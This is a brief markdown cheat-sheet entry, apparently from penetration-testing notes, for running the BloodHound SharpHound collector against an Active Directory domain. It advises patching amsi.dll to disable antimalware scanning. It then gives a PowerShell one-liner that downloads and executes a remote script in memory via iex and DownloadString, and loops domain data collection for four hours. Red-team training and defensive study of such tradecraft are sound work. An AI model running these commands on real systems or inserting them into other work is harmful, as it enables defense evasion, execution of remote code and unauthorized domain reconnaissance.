# Invoke-BloodHound
It is recommended to [patch amsi.dll](https://github.com/okazymyrov/piki/blob/master/PowerShell.md#patching-amsidll-amsiscanbuffer-by-rasta-mouse) first.
```powershell
iex(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/BloodHoundAD/BloodHound/master/Collectors/SharpHound.ps1')
Invoke-BloodHound -Domain <domain> -CollectionMethod All -Loop -LoopInterval 00:05:00 -LoopDuration 04:00:00
```
